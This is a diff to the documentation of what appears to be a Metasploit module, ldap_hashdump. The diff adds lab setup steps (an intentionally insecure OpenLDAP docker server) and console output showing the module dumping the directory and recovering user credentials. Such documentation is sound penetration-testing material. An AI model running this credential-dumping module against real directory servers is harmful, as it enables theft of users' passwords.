@@ -8,8 +8,64 @@ Searching for specific attributes it collects user credentials.
 
 ### Setup
 
-Tested in the wild. No setup notes available at this time, as setup will
-be specific to target environment.
+Tested in the wild.
+
+You may eventually setup an intentionally insecure OpenLDAP server in docker.
+The below OpenLDAP server does not have any ACL, therefore the hashPassword
+attributes are readable by anonymous clients.
+
+```
+$ git clone https://github.com/HynekPetrak/bitnami-docker-openldap.git
+$ cd bitnami-docker-openldap
+$ docker-compose up -d
+Creating bitnami-docker-openldap_openldap_1 ... done
+
+msf5 auxiliary(gather/ldap_hashdump) > set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+msf5 auxiliary(gather/ldap_hashdump) > set RPORT 1389
+RPORT => 1389
+msf5 auxiliary(gather/ldap_hashdump) > options
+
+Module options (auxiliary/gather/ldap_hashdump):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   BASE_DN                     no        LDAP base DN if you already have it
+   BIND_DN                     no        The username to authenticate to LDAP server
+   BIND_PW                     no        Password for the BIND_DN
+   PASS_ATTR  userPassword     yes       LDAP attribute, that contains password hashes
+   RHOSTS     127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      1389             yes       The target port
+   SSL        false            no        Enable SSL on the LDAP connection
+   USER_ATTR  dn               no        LDAP attribute, that contains username
+
+
+Auxiliary action:
+
+   Name  Description
+   ----  -----------
+   Dump  Dump all LDAP data
+
+
+msf5 auxiliary(gather/ldap_hashdump) >
+
+msf5 auxiliary(gather/ldap_hashdump) > run
+[*] Running module against 127.0.0.1
+
+[*] Discovering base DN automatically
+[*] Searching root DSE for base DN
+[+] Discovered base DN: dc=example,dc=org
+[*] Dumping LDAP data from server at 127.0.0.1:1389
+[*] Storing LDAP data in loot
+[+] Saved LDAP data to /home/hynek/.msf4/loot/20200801220435_default_127.0.0.1_LDAPInformation_704646.txt
+[*] Searching for attribute: userPassword
+[*] Taking dn attribute as username
+[+] Credentials found: cn=user01,ou=users,dc=example,dc=org:password1
+[+] Credentials found: cn=user02,ou=users,dc=example,dc=org:password2
+[*] Auxiliary module execution completed
+msf5 auxiliary(gather/ldap_hashdump) >
+
+```
 
 ## Verification Steps
 
